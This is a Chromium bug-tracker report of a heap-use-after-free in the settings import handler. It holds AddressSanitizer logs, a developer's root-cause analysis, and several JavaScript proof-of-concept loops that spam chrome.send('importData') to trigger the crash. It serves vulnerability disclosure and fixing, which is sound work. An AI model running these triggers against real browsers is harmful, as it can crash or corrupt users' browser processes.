# Heap-use-after-free in ImportDataHandler::~ImportDataHandler

| Field | Value |
|-------|-------|
| **Issue ID** | [40058962](https://issues.chromium.org/issues/40058962) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P2 |
| **Component** | UI>Browser>Import |
| **Platforms** | Windows |
| **Reporter** | sa...@gmail.com |
| **Assignee** | to...@chromium.org |
| **Created** | 2022-03-03 |
| **Bounty** | $2,000.00 |

## Description

UserAgent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36

Steps to reproduce the problem:
1) Go to chrome://settings/
2) Click the "Import bookmarks and settings" button.
3) Quickly double-click the "Import" button.

I've only been able to reproduce this once, I have a high score CPS mouse. I think there is a race condition here. Before the import is complete, the user can perform one more import, and `importer_host_` becomes free after the import is complete. The next import will be UaF.[1]

https://source.chromium.org/chromium/chromium/src/+/main:chrome/browser/ui/webui/settings/import_data_handler.h;drc=fa1dd1718cd4860ad3b9cc4d892812f911bb837f;l=74`

```
  // If non-null it means importing is in progress. ImporterHost takes care
  // of deleting itself when import is complete.
  raw_ptr<ExternalProcessImporterHost> importer_host_;  // weak`

```

https://source.chromium.org/chromium/chromium/src/+/main:chrome/browser/ui/webui/settings/import_data_handler.cc;drc=ca4b47d1034408a70ad7a7b7ad1a8355ec1d4993;l=49
```
ImportDataHandler::~ImportDataHandler() {
  DCHECK_CURRENTLY_ON(BrowserThread::UI);

  if (importer_host_)
    importer_host_->set_observer(nullptr); //[1]

  if (select_file_dialog_.get())
    select_file_dialog_->ListenerDestroyed();
}
```

What is the expected behavior?

What went wrong?
==52624==ERROR: AddressSanitizer: heap-use-after-free on address 0x12d48ac8e958 at pc 0x7ff88d4727db bp 0x00fd23dfcdc0 sp 0x00fd23dfce08
WRITE of size 8 at 0x12d48ac8e958 thread T0
==52624==WARNING: Failed to use and restart external symbolizer!
    #0 0x7ff88d4727da in settings::ImportDataHandler::~ImportDataHandler C:\b\s\w\ir\cache\builder\src\chrome\browser\ui\webui\settings\import_data_handler.cc:49
    #1 0x7ff88d475d23 in settings::ImportDataHandler::~ImportDataHandler C:\b\s\w\ir\cache\builder\src\chrome\browser\ui\webui\settings\import_data_handler.cc:45
    #2 0x7ff8780900f4 in std::__1::__vector_base<std::__1::unique_ptr<perfetto::internal::TracingMuxerImpl::ConsumerImpl,std::__1::default_delete<perfetto::internal::TracingMuxerImpl::ConsumerImpl> >,std::__1::allocator<std::__1::unique_ptr<perfetto::internal::TracingMuxerImpl::ConsumerImpl,std::__1::default_delete<perfetto::internal::TracingMuxerImpl::ConsumerImpl> > > >::~__vector_base C:\b\s\w\ir\cache\builder\src\buildtools\third_party\libc++\trunk\include\vector:466
    #3 0x7ff87d06d24d in content::WebUIImpl::~WebUIImpl C:\b\s\w\ir\cache\builder\src\content\browser\webui\web_ui_impl.cc:85
    #4 0x7ff87d071c63 in content::WebUIImpl::~WebUIImpl C:\b\s\w\ir\cache\builder\src\content\browser\webui\web_ui_impl.cc:79
    #5 0x7ff87cb875a3 in content::RenderFrameHostManager::ClearWebUIInstances C:\b\s\w\ir\cache\builder\src\content\browser\renderer_host\render_frame_host_manager.cc:873
    #6 0x7ff87c8dcae1 in content::FrameTree::Shutdown C:\b\s\w\ir\cache\builder\src\content\browser\renderer_host\frame_tree.cc:945
    #7 0x7ff87cefd985 in content::WebContentsImpl::~WebContentsImpl C:\b\s\w\ir\cache\builder\src\content\browser\web_contents\web_contents_impl.cc:1045
    #8 0x7ff87cf72ac3 in content::WebContentsImpl::~WebContentsImpl C:\b\s\w\ir\cache\builder\src\content\browser\web_contents\web_contents_impl.cc:991
    #9 0x7ff885886ad4 in TabStripModel::SendDetachWebContentsNotifications C:\b\s\w\ir\cache\builder\src\chrome\browser\ui\tabs\tab_strip_model.cc:569
    #10 0x7ff88588d4d6 in TabStripModel::CloseTabs C:\b\s\w\ir\cache\builder\src\chrome\browser\ui\tabs\tab_strip_model.cc:1919
    #11 0x7ff88588ca13 in TabStripModel::CloseAllTabs C:\b\s\w\ir\cache\builder\src\chrome\browser\ui\tabs\tab_strip_model.cc:762
    #12 0x7ff8893aa31b in BrowserView::OnWindowCloseRequested C:\b\s\w\ir\cache\builder\src\chrome\browser\ui\views\frame\browser_view.cc:3279
    #13 0x7ff883012de3 in views::Widget::CloseWithReason C:\b\s\w\ir\cache\builder\src\ui\views\widget\widget.cc:657
    #14 0x7ff882fb6f65 in base::internal::Invoker<base::internal::BindState<`lambda at ../../ui/views/controls/button/button.cc:111:31',base::RepeatingCallback<void ()> >,void (const ui::Event &)>::Run C:\b\s\w\ir\cache\builder\src\base\bind_internal.h:761
    #15 0x7ff882fb462f in views::Button::NotifyClick C:\b\s\w\ir\cache\builder\src\ui\views\controls\button\button.cc:648
    #16 0x7ff882fb0941 in views::Button::DefaultButtonControllerDelegate::NotifyClick C:\b\s\w\ir\cache\builder\src\ui\views\controls\button\button.cc:67
    #17 0x7ff885d00836 in views::ButtonController::OnMouseReleased C:\b\s\w\ir\cache\builder\src\ui\views\controls\button\button_controller.cc:59
    #18 0x7ff882ff4a50 in views::View::ProcessMouseReleased C:\b\s\w\ir\cache\builder\src\ui\views\view.cc:3074
    #19 0x7ff88cd22766 in ui::ScopedTargetHandler::OnEvent C:\b\s\w\ir\cache\builder\src\ui\events\scoped_target_handler.cc:28
    #20 0x7ff883fba7a1 in ui::EventDispatcher::DispatchEvent C:\b\s\w\ir\cache\builder\src\ui\events\event_dispatcher.cc:190
    #21 0x7ff883fb9cc1 in ui::EventDispatcher::ProcessEvent C:\b\s\w\ir\cache\builder\src\ui\events\event_dispatcher.cc:139
    #22 0x7ff883fb95ab in ui::EventDispatcherDelegate::DispatchEventToTarget C:\b\s\w\ir\cache\builder\src\ui\events\event_dispatcher.cc:83
    #23 0x7ff883fb91ec in ui::EventDispatcherDelegate::DispatchEvent C:\b\s\w\ir\cache\builder\src\ui\events\event_dispatcher.cc:55
    #24 0x7ff885d7cc9b in views::internal::RootView::OnMouseReleased C:\b\s\w\ir\cache\builder\src\ui\views\widget\root_view.cc:485
    #25 0x7ff88301cb76 in views::Widget::OnMouseEvent C:\b\s\w\ir\cache\builder\src\ui\views\widget\widget.cc:1546
    #26 0x7ff883fba7a1 in ui::EventDispatcher::DispatchEvent C:\b\s\w\ir\cache\builder\src\ui\events\event_dispatcher.cc:190
    #27 0x7ff883fb9cc1 in ui::EventDispatcher::ProcessEvent C:\b\s\w\ir\cache\builder\src\ui\events\event_dispatcher.cc:139
    #28 0x7ff883fb95ab in ui::EventDispatcherDelegate::DispatchEventToTarget C:\b\s\w\ir\cache\builder\src\ui\events\event_dispatcher.cc:83
    #29 0x7ff883fb91ec in ui::EventDispatcherDelegate::DispatchEvent C:\b\s\w\ir\cache\builder\src\ui\events\event_dispatcher.cc:55
    #30 0x7ff888e2b1e6 in ui::EventProcessor::OnEventFromSource C:\b\s\w\ir\cache\builder\src\ui\events\event_processor.cc:49
    #31 0x7ff885d6f28f in ui::EventSource::DeliverEventToSink C:\b\s\w\ir\cache\builder\src\ui\events\event_source.cc:118
    #32 0x7ff885d6eee9 in ui::EventSource::SendEventToSinkFromRewriter C:\b\s\w\ir\cache\builder\src\ui\events\event_source.cc:143
    #33 0x7ff885d6e9eb in ui::EventSource::SendEventToSink C:\b\s\w\ir\cache\builder\src\ui\events\event_source.cc:112
    #34 0x7ff888e28cf1 in views::DesktopWindowTreeHostWin::HandleMouseEvent C:\b\s\w\ir\cache\builder\src\ui\views\widget\desktop_aura\desktop_window_tree_host_win.cc:1004
    #35 0x7ff88cd909da in views::HWNDMessageHandler::HandleMouseEventInternal C:\b\s\w\ir\cache\builder\src\ui\views\win\hwnd_message_handler.cc:3159
    #36 0x7ff88cd89e0b in views::HWNDMessageHandler::_ProcessWindowMessage C:\b\s\w\ir\cache\builder\src\ui\views\win\hwnd_message_handler.h:358
    #37 0x7ff88cd894aa in views::HWNDMessageHandler::OnWndProc C:\b\s\w\ir\cache\builder\src\ui\views\win\hwnd_message_handler.cc:1027
    #38 0x7ff8864a1266 in gfx::WindowImpl::WndProc C:\b\s\w\ir\cache\builder\src\ui\gfx\win\window_impl.cc:306
    #39 0x7ff88649fb81 in base::win::WrappedWindowProc<&gfx::WindowImpl::WndProc> C:\b\s\w\ir\cache\builder\src\base\win\wrapped_window_proc.h:74
    #40 0x7ff949d71c4b in CallWindowProcW+0x43b (C:\WINDOWS\System32\user32.dll+0x180011c4b)
    #41 0x7ff949d70ea5 in DispatchMessageW+0x2b5 (C:\WINDOWS\System32\user32.dll+0x180010ea5)
    #42 0x7ff883380718 in base::MessagePumpForUI::ProcessMessageHelper C:\b\s\w\ir\cache\builder\src\base\message_loop\message_pump_win.cc:542
    #43 0x7ff88337e749 in base::MessagePumpForUI::ProcessNextWindowsMessage C:\b\s\w\ir\cache\builder\src\base\message_loop\message_pump_win.cc:504
    #44 0x7ff88337e043 in base::MessagePumpForUI::DoRunLoop C:\b\s\w\ir\cache\builder\src\base\message_loop\message_pump_win.cc:215
    #45 0x7ff88337c378 in base::MessagePumpWin::Run C:\b\s\w\ir\cache\builder\src\base\message_loop\message_pump_win.cc:78
    #46 0x7ff886144850 in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::Run C:\b\s\w\ir\cache\builder\src\base\task\sequence_manager\thread_controller_with_message_pump_impl.cc:497
    #47 0x7ff88324e423 in base::RunLoop::Run C:\b\s\w\ir\cache\builder\src\base\run_loop.cc:141
    #48 0x7ff87bfea271 in content::BrowserMainLoop::RunMainMessageLoop C:\b\s\w\ir\cache\builder\src\content\browser\browser_main_loop.cc:1072
    #49 0x7ff87bfef8db in content::BrowserMainRunnerImpl::Run C:\b\s\w\ir\cache\builder\src\content\browser\browser_main_runner_impl.cc:155
    #50 0x7ff87bfe376d in content::BrowserMain C:\b\s\w\ir\cache\builder\src\content\browser\browser_main.cc:30
    #51 0x7ff882e82807 in content::RunBrowserProcessMain C:\b\s\w\ir\cache\builder\src\content\app\content_main_runner_impl.cc:642
    #52 0x7ff882e85972 in content::ContentMainRunnerImpl::RunBrowser C:\b\s\w\ir\cache\builder\src\content\app\content_main_runner_impl.cc:1175
    #53 0x7ff882e84ab2 in content::ContentMainRunnerImpl::Run C:\b\s\w\ir\cache\builder\src\content\app\content_main_runner_impl.cc:1042
    #54 0x7ff882e81483 in content::RunContentProcess C:\b\s\w\ir\cache\builder\src\content\app\content_main.cc:401
    #55 0x7ff882e81c07 in content::ContentMain C:\b\s\w\ir\cache\builder\src\content\app\content_main.cc:429
    #56 0x7ff877fe14ca in ChromeMain C:\b\s\w\ir\cache\builder\src\chrome\app\chrome_main.cc:176
    #57 0x7ff6f1545b16 in MainDllLoader::Launch C:\b\s\w\ir\cache\builder\src\chrome\app\main_dll_loader_win.cc:167
    #58 0x7ff6f1542b5f in main C:\b\s\w\ir\cache\builder\src\chrome\app\chrome_exe_main_win.cc:382
    #59 0x7ff6f193d2a3 in __scrt_common_main_seh d:\A01\_work\6\s\src\vctools\crt\vcstartup\src\startup\exe_common.inl:288
    #60 0x7ff949ba54df in BaseThreadInitThunk+0xf (C:\WINDOWS\System32\KERNEL32.DLL+0x1800154df)
    #61 0x7ff94aec485a in RtlUserThreadStart+0x2a (C:\WINDOWS\SYSTEM32\ntdll.dll+0x18000485a)

0x12d48ac8e958 is located 24 bytes inside of 248-byte region [0x12d48ac8e940,0x12d48ac8ea38)
freed by thread T0 here:
    #0 0x7ff6f15ed28b in free C:\b\s\w\ir\cache\builder\src\third_party\llvm\compiler-rt\lib\asan\asan_malloc_win.cpp:82
    #1 0x7ff8860d56e3 in ExternalProcessImporterHost::~ExternalProcessImporterHost C:\b\s\w\ir\cache\builder\src\chrome\browser\importer\external_process_importer_host.cc:95
    #2 0x7ff8836088d3 in mojo::InterfaceEndpointClient::NotifyError C:\b\s\w\ir\cache\builder\src\mojo\public\cpp\bindings\lib\interface_endpoint_client.cc:693
    #3 0x7ff88361e8f8 in mojo::internal::MultiplexRouter::ProcessNotifyErrorTask C:\b\s\w\ir\cache\builder\src\mojo\public\cpp\bindings\lib\multiplex_router.cc:1016
    #4 0x7ff8836188c0 in mojo::internal::MultiplexRouter::ProcessTasks C:\b\s\w\ir\cache\builder\src\mojo\public\cpp\bindings\lib\multiplex_router.cc:929
    #5 0x7ff883615856 in mojo::internal::MultiplexRouter::OnPipeConnectionError C:\b\s\w\ir\cache\builder\src\mojo\public\cpp\bindings\lib\multiplex_router.cc:839
    #6 0x7ff8835fe6bb in mojo::Connector::HandleError C:\b\s\w\ir\cache\builder\src\mojo\public\cpp\bindings\lib\connector.cc:688
    #7 0x7ff883654c7a in mojo::SimpleWatcher::OnHandleReady C:\b\s\w\ir\cache\builder\src\mojo\public\cpp\system\simple_watcher.cc:278
    #8 0x7ff8832ce754 in base::TaskAnnotator::RunTaskImpl C:\b\s\w\ir\cache\builder\src\base\task\common\task_annotator.cc:135
    #9 0x7ff886143125 in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl C:\b\s\w\ir\cache\builder\src\base\task\sequence_manager\thread_controller_with_message_pump_impl.cc:385
    #10 0x7ff8861426f9 in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWork C:\b\s\w\ir\cache\builder\src\base\task\sequence_manager\thread_controller_with_message_pump_impl.cc:290
    #11 0x7ff88337e0e6 in base::MessagePumpForUI::DoRunLoop C:\b\s\w\ir\cache\builder\src\base\message_loop\message_pump_win.cc:220
    #12 0x7ff88337c378 in base::MessagePumpWin::Run C:\b\s\w\ir\cache\builder\src\base\message_loop\message_pump_win.cc:78
    #13 0x7ff886144850 in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::Run C:\b\s\w\ir\cache\builder\src\base\task\sequence_manager\thread_controller_with_message_pump_impl.cc:497
    #14 0x7ff88324e423 in base::RunLoop::Run C:\b\s\w\ir\cache\builder\src\base\run_loop.cc:141
    #15 0x7ff87bfea271 in content::BrowserMainLoop::RunMainMessageLoop C:\b\s\w\ir\cache\builder\src\content\browser\browser_main_loop.cc:1072
    #16 0x7ff87bfef8db in content::BrowserMainRunnerImpl::Run C:\b\s\w\ir\cache\builder\src\content\browser\browser_main_runner_impl.cc:155
    #17 0x7ff87bfe376d in content::BrowserMain C:\b\s\w\ir\cache\builder\src\content\browser\browser_main.cc:30
    #18 0x7ff882e82807 in content::RunBrowserProcessMain C:\b\s\w\ir\cache\builder\src\content\app\content_main_runner_impl.cc:642
    #19 0x7ff882e85972 in content::ContentMainRunnerImpl::RunBrowser C:\b\s\w\ir\cache\builder\src\content\app\content_main_runner_impl.cc:1175
    #20 0x7ff882e84ab2 in content::ContentMainRunnerImpl::Run C:\b\s\w\ir\cache\builder\src\content\app\content_main_runner_impl.cc:1042
    #21 0x7ff882e81483 in content::RunContentProcess C:\b\s\w\ir\cache\builder\src\content\app\content_main.cc:401
    #22 0x7ff882e81c07 in content::ContentMain C:\b\s\w\ir\cache\builder\src\content\app\content_main.cc:429
    #23 0x7ff877fe14ca in ChromeMain C:\b\s\w\ir\cache\builder\src\chrome\app\chrome_main.cc:176
    #24 0x7ff6f1545b16 in MainDllLoader::Launch C:\b\s\w\ir\cache\builder\src\chrome\app\main_dll_loader_win.cc:167
    #25 0x7ff6f1542b5f in main C:\b\s\w\ir\cache\builder\src\chrome\app\chrome_exe_main_win.cc:382
    #26 0x7ff6f193d2a3 in __scrt_common_main_seh d:\A01\_work\6\s\src\vctools\crt\vcstartup\src\startup\exe_common.inl:288
    #27 0x7ff949ba54df in BaseThreadInitThunk+0xf (C:\WINDOWS\System32\KERNEL32.DLL+0x1800154df)

previously allocated by thread T0 here:
    #0 0x7ff6f15ed38b in malloc C:\b\s\w\ir\cache\builder\src\third_party\llvm\compiler-rt\lib\asan\asan_malloc_win.cpp:98
    #1 0x7ff895b6f7de in operator new d:\A01\_work\6\s\src\vctools\crt\vcstartup\src\heap\new_scalar.cpp:35
    #2 0x7ff88d4748e6 in settings::ImportDataHandler::StartImport C:\b\s\w\ir\cache\builder\src\chrome\browser\ui\webui\settings\import_data_handler.cc:96
    #3 0x7ff88d47393f in settings::ImportDataHandler::HandleImportData C:\b\s\w\ir\cache\builder\src\chrome\browser\ui\webui\settings\import_data_handler.cc:140
    #4 0x7ff87d07149f in content::WebUIImpl::ProcessWebUIMessage C:\b\s\w\ir\cache\builder\src\content\browser\webui\web_ui_impl.cc:287
    #5 0x7ff87d06db42 in content::WebUIImpl::Send C:\b\s\w\ir\cache\builder\src\content\browser\webui\web_ui_impl.cc:111
    #6 0x7ff87b2761e7 in content::mojom::WebUIHostStubDispatch::Accept C:\b\s\w\ir\cache\builder\src\out\Release_x64\gen\content\common\web_ui.mojom.cc:187
    #7 0x7ff883604788 in mojo::InterfaceEndpointClient::HandleValidatedMessage C:\b\s\w\ir\cache\builder\src\mojo\public\cpp\bindings\lib\interface_endpoint_client.cc:921
    #8 0x7ff886284bca in mojo::MessageDispatcher::Accept C:\b\s\w\ir\cache\builder\src\mojo\public\cpp\bindings\lib\message_dispatcher.cc:43
    #9 0x7ff8836083aa in mojo::InterfaceEndpointClient::HandleIncomingMessage C:\b\s\w\ir\cache\builder\src\mojo\public\cpp\bindings\lib\interface_endpoint_client.cc:663
    #10 0x7ff883f1e2a1 in IPC::`anonymous namespace'::ChannelAssociatedGroupController::AcceptOnEndpointThread C:\b\s\w\ir\cache\builder\src\ipc\ipc_mojo_bootstrap.cc:1010
    #11 0x7ff883f17ebd in base::internal::Invoker<base::internal::BindState<void (IPC::(anonymous namespace)::ChannelAssociatedGroupController::*)(mojo::Message),scoped_refptr<IPC::(anonymous namespace)::ChannelAssociatedGroupController>,mojo::Message>,void ()>::RunOnce C:\b\s\w\ir\cache\builder\src\base\bind_internal.h:748
    #12 0x7ff8832ce754 in base::TaskAnnotator::RunTaskImpl C:\b\s\w\ir\cache\builder\src\base\task\common\task_annotator.cc:135
    #13 0x7ff886143125 in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl C:\b\s\w\ir\cache\builder\src\base\task\sequence_manager\thread_controller_with_message_pump_impl.cc:385
    #14 0x7ff8861426f9 in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWork C:\b\s\w\ir\cache\builder\src\base\task\sequence_manager\thread_controller_with_message_pump_impl.cc:290
    #15 0x7ff88337e0e6 in base::MessagePumpForUI::DoRunLoop C:\b\s\w\ir\cache\builder\src\base\message_loop\message_pump_win.cc:220
    #16 0x7ff88337c378 in base::MessagePumpWin::Run C:\b\s\w\ir\cache\builder\src\base\message_loop\message_pump_win.cc:78
    #17 0x7ff886144850 in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::Run C:\b\s\w\ir\cache\builder\src\base\task\sequence_manager\thread_controller_with_message_pump_impl.cc:497
    #18 0x7ff88324e423 in base::RunLoop::Run C:\b\s\w\ir\cache\builder\src\base\run_loop.cc:141
    #19 0x7ff87bfea271 in content::BrowserMainLoop::RunMainMessageLoop C:\b\s\w\ir\cache\builder\src\content\browser\browser_main_loop.cc:1072
    #20 0x7ff87bfef8db in content::BrowserMainRunnerImpl::Run C:\b\s\w\ir\cache\builder\src\content\browser\browser_main_runner_impl.cc:155
    #21 0x7ff87bfe376d in content::BrowserMain C:\b\s\w\ir\cache\builder\src\content\browser\browser_main.cc:30
    #22 0x7ff882e82807 in content::RunBrowserProcessMain C:\b\s\w\ir\cache\builder\src\content\app\content_main_runner_impl.cc:642
    #23 0x7ff882e85972 in content::ContentMainRunnerImpl::RunBrowser C:\b\s\w\ir\cache\builder\src\content\app\content_main_runner_impl.cc:1175
    #24 0x7ff882e84ab2 in content::ContentMainRunnerImpl::Run C:\b\s\w\ir\cache\builder\src\content\app\content_main_runner_impl.cc:1042
    #25 0x7ff882e81483 in content::RunContentProcess C:\b\s\w\ir\cache\builder\src\content\app\content_main.cc:401
    #26 0x7ff882e81c07 in content::ContentMain C:\b\s\w\ir\cache\builder\src\content\app\content_main.cc:429
    #27 0x7ff877fe14ca in ChromeMain C:\b\s\w\ir\cache\builder\src\chrome\app\chrome_main.cc:176

SUMMARY: AddressSanitizer: heap-use-after-free C:\b\s\w\ir\cache\builder\src\chrome\browser\ui\webui\settings\import_data_handler.cc:49 in settings::ImportDataHandler::~ImportDataHandler
Shadow bytes around the buggy address:
  0x050d1bb91cd0: fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd
  0x050d1bb91ce0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x050d1bb91cf0: fd fd fd fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x050d1bb91d00: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x050d1bb91d10: fd fd fd fd fd fd fd fd fd fd fd fa fa fa fa fa
=>0x050d1bb91d20: fa fa fa fa fa fa fa fa fd fd fd[fd]fd fd fd fd
  0x050d1bb91d30: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x050d1bb91d40: fd fd fd fd fd fd fd fa fa fa fa fa fa fa fa fa
  0x050d1bb91d50: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x050d1bb91d60: fd fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa
  0x050d1bb91d70: fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
==52624==ABORTING

Did this work before? N/A 

Chrome version: 98.0.4758.102  Channel: n/a
OS Version: 10.0

Thanks,

Samet Bekmezci @sametbekmezci

## Attachments

- [asan.log](attachments/asan.log) (text/plain, 18.3 KB)
- [new-asan.log](attachments/new-asan.log) (text/plain, 133.2 KB)
- [poc.mp4](attachments/poc.mp4) (video/mp4, 20.7 MB)
- [payload.txt](attachments/payload.txt) (text/plain, 28.6 KB)

## Timeline

### [Deleted User] (2022-03-03)

[Empty comment from Monorail migration]

### dc...@chromium.org (2022-03-04)

Are you able to reproduce this by manually invoking the WebUI handlers in devtools?

I tried running:

chrome.send("importData", [0, {"import_dialog_autofill_form_data": true, "import_dialog_bookmarks": true, "import_dialog_history": true, "import_dialog_saved_passwords": true, "import_dialog_search_engine": true}]);chrome.send("importData", [0, {"import_dialog_autofill_form_data": true, "import_dialog_bookmarks": true, "import_dialog_history": true, "import_dialog_saved_passwords": true, "import_dialog_search_engine": true}]);

in devtools, but I did not get a crash. I also examined the code manually. The free stack in the asan log comes from here: https://source.chromium.org/chromium/chromium/src/+/main:chrome/browser/importer/external_process_importer_client.cc;l=95;drc=92bf6b5ec8a34ea1c06a70f86ea05d66bf82da08

Which eventually calls https://source.chromium.org/chromium/chromium/src/+/main:chrome/browser/importer/external_process_importer_host.cc;l=91;drc=92bf6b5ec8a34ea1c06a70f86ea05d66bf82da08 to notify ImportDataHandler to clear its pointer to the importer host: https://source.chromium.org/chromium/chromium/src/+/main:chrome/browser/ui/webui/settings/import_data_handler.cc;l=240;drc=92bf6b5ec8a34ea1c06a70f86ea05d66bf82da08

Before ExternalProcessImporterHost deletes itself: https://source.chromium.org/chromium/chromium/src/+/main:chrome/browser/importer/external_process_importer_host.cc;l=92;drc=92bf6b5ec8a34ea1c06a70f86ea05d66bf82da08

As far as I can see, there is no other path for ExternalProcessImporterHost to be deleted, so in light of that, I'm having trouble understanding how we could even have a UaF.

### sa...@gmail.com (2022-03-04)

[Comment Deleted]

### sa...@gmail.com (2022-03-04)

Hi, I created a new load by changing the load you gave and got the new asan log. Apparently this also seems to affect windows as well. (You can add someone from windows team to this report.) To encounter UaF, chrome tab must be sad face and then you need to close chrome. This works for me with a 5/1 trial rate. But this situation appeared in my first test with the mouse. Since this situation corrupted the memory, I could not get a screen recording, so I created a video recording with the phone. I think there might be an easier way to test this.



### [Deleted User] (2022-03-04)

Thank you for providing more feedback. Adding the requester to the cc list.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sa...@gmail.com (2022-03-05)

small poc:

for (let index = 0; index < 100; index++) {
            chrome.send("importData", [0, {
                "import_dialog_autofill_form_data": true,
                "import_dialog_bookmarks": true,
                "import_dialog_history": true,
                "import_dialog_saved_passwords": true,
                "import_dialog_search_engine": true
            }]);
}



### dc...@chromium.org (2022-03-08)

I am not able to reproduce still with the publicly available chromium browser asan builds.

I did a manual inspection and I see only one place where a UaF could theoretically happen: OnJavascriptDisallowed() clears the observer for the ExternalProcessImporterHost, but does not null out the pointer: https://source.chromium.org/chromium/chromium/src/+/main:chrome/browser/ui/webui/settings/import_data_handler.cc;l=77;drc=ca4b47d1034408a70ad7a7b7ad1a8355ec1d4993

So I suspect that in very rare circumstances, it's possible to trigger a UaF here if:

1. the WebUI RenderFrame is deleted (by navigating away or by a crash)
2. which triggers DisallowJavascriptOnAllHandlers()
3. which clears the observer for ExternalProcessImporterHost in ImportDataHandler
4. the importer finishes and deletes itself
5. then we asynchronously deleted the RFH later (this can definitely happen in the case of a crash; I'm less certain about the navigation timing)

At this point, we didn't clear the importer_host_ (in step #3) pointer so we UaF in ~ImportDataHandler when we destroy the RenderFrameHostImpl and the tree of associated WebUI objects.

So despite being a browser process UaF, this is medium at best, and possibly low given how hard it is to trigger this.

Tagging FoundIn-75 since this dates to at least https://crrev.com/bc3a1fed587712156737197e561a88f2ea0bfecc, and is probably older.

[Monorail components: UI>Browser>Import]

### dc...@chromium.org (2022-03-08)

Actually I'm going to go ahead and mark this low given how difficult it is to reach/trigger.

### [Deleted User] (2022-03-08)

[Empty comment from Monorail migration]

### sa...@gmail.com (2022-03-08)

Actually, there is no simultaneous process here, it works when I first run it, but sometimes it doesn't happen, I guess it's a CPU related situation. So it takes enough loops for the tab to crash. I'll test this again on my different computers. Please share your results with me.

Can you try again using the following PoCs in order? Can you share a video?

(1)

for (let index = 0; index < 100; index++) {
            chrome.send("importData", [0, {
                "import_dialog_autofill_form_data": true,
                "import_dialog_bookmarks": true,
                "import_dialog_history": true,
                "import_dialog_saved_passwords": true,
                "import_dialog_search_engine": true
            }]);
}

(2)

for (let index = 0; index < 500; index++) {
            chrome.send("importData", [0, {
                "import_dialog_autofill_form_data": true,
                "import_dialog_bookmarks": true,
                "import_dialog_history": true,
                "import_dialog_saved_passwords": true,
                "import_dialog_search_engine": true
            }]);
}

(3)

for (let index = 0; index < 1000; index++) {
            chrome.send("importData", [0, {
                "import_dialog_autofill_form_data": true,
                "import_dialog_bookmarks": true,
                "import_dialog_history": true,
                "import_dialog_saved_passwords": true,
                "import_dialog_search_engine": true
            }]);
}

### dc...@chromium.org (2022-07-14)

[Empty comment from Monorail migration]

### dc...@chromium.org (2022-07-14)

Can someone who's familiar with this take another look? We've had another recent report which I just duped into this bug.

### dc...@chromium.org (2022-07-14)

Raising this to medium so it will be more actively tracked (read: nagged) and CCing OWNERS from chrome/browser/resources/settings/OWNERS.

### [Deleted User] (2022-07-15)

tommycli: Uh oh! This issue still open and hasn't been updated in the last 133 days. This is a serious vulnerability, and we want to ensure that there's progress. Could you please leave an update with the current status and any potential blockers?

If you're not the right owner for this issue, could you please remove yourself as soon as possible or help us find the right one?

If the issue is fixed or you can't reproduce it, please close the bug. If you've started working on a fix, please set the status to Started.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2022-07-15)

Setting Pri-1 to match security severity Medium. If this is incorrect, please reset the priority. Sheriffbot won't make this change again.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2022-07-29)

tommycli: Uh oh! This issue still open and hasn't been updated in the last 147 days. This is a serious vulnerability, and we want to ensure that there's progress. Could you please leave an update with the current status and any potential blockers?

If you're not the right owner for this issue, could you please remove yourself as soon as possible or help us find the right one?

If the issue is fixed or you can't reproduce it, please close the bug. If you've started working on a fix, please set the status to Started.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sa...@gmail.com (2022-07-29)

uh oh

⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣆⢀⣶⡶⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢈⣿⢸⠟⣠⣶⡷⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⣀⠀⢀⣠⠴⠴⠶⠚⠿⠿⠾⠭⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⠴⢋⡽⠚⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠢⣀⠀⠀⠀⠀⠀⠀
⠀⠀⢀⡔⠁⡰⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⠚⠛⣖⠀⠀⠀⠀
⠀⢀⡏⠀⡼⢡⠚⡛⠒⣄⠀⠀⠀⠀⣠⠖⠛⠛⠲⡄⠐⢯⠁⠀⠀⠹⡧⠀⠀⠀
